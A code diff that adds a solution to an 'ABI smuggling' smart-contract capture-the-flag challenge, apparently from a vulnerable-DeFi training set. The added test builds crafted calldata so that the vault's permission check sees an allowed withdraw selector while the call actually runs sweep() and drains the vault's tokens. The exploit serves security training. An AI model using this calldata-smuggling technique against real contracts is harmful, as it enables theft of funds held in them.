@@ -19,8 +19,8 @@ describe('[Challenge] ABI smuggling', function () {
         expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);
 
         // Set permissions
-        const deployerPermission = await vault.getActionId('0x85fb709d', deployer.address, vault.address);
-        const playerPermission = await vault.getActionId('0xd9caed12', player.address, vault.address);
+        const deployerPermission = await vault.getActionId('0x85fb709d', deployer.address, vault.address); 
+        const playerPermission = await vault.getActionId('0xd9caed12', player.address, vault.address); 
         await vault.setPermissions([deployerPermission, playerPermission]);
         expect(await vault.permissions(deployerPermission)).to.be.true;
         expect(await vault.permissions(playerPermission)).to.be.true;
@@ -45,6 +45,45 @@ describe('[Challenge] ABI smuggling', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        /** 
+         * Solution: Attack is based on the fact that buffer data
+         * is moveable around inside of calldata. Can relocate executed 
+         * function sig and data to a different spot than what is checked
+         * in the authorization step.
+         */
+
+        const abi = ethers.utils.defaultAbiCoder;   
+        let actionData = ethers.utils.solidityPack(
+            ["bytes4", "address", "address", "bytes24"], 
+            [
+               '0x85fb709d', /* sweep() */
+               abi.encode([ "address"], [recovery.address]), 
+               abi.encode([ "address"], [token.address]), 
+               "0xffffffffffffffffffffffffffffffffffffffffffffffff"] /* padding */
+            );
+        let values = ethers.utils.solidityPack(
+            ["bytes4" , /* execute()                         */
+             "address", /* vault address                     */
+             "uint256", /* points to buffer start            */
+             "uint256", /* junk                              */
+             "bytes32", /* fake funciton sig                 */ 
+             "uint256", /* buffer start, holds size          */ 
+             "bytes"    /* calldata to sweep()               */
+            ], 
+            ["0x1cff79cd",
+              abi.encode([ "address"], [vault.address]), 
+              128, 
+              64, 
+              '0xd9caed1200000000000000000000000000000000000000000000000000000000', 
+              72, 
+              actionData]);
+
+
+        const tx = await player.sendTransaction({
+            to: vault.address,
+            data: values,
+        }); 
     });
 
     after(async function () {
